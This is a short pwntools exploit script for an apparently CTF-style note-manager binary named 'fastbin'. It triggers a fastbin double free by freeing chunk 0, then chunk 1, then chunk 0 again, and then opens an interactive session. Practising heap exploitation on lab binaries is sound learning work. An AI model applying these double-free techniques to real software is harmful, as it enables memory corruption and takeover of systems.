#!/usr/bin/env python3
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def note_init(name):
    p.recvuntil("what's your name:\n")
    p.send(name)
    p.recvuntil('hello, ')

def note_create(size, data):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size ?')
    p.sendline(str(size))
    p.recvuntil('data:')
    p.sendline(data)

def note_delete(index):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index?')
    p.sendline(str(index))

def note_print(index):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(index))

p = process('./fastbin')
elf = ELF('./fastbin')
#gdb.attach(p, "")

note_init('aaa')
note_create(0x70, 'a')
note_create(0x70, 'a')
note_delete(0)
note_delete(1)
note_delete(0)

p.interactive()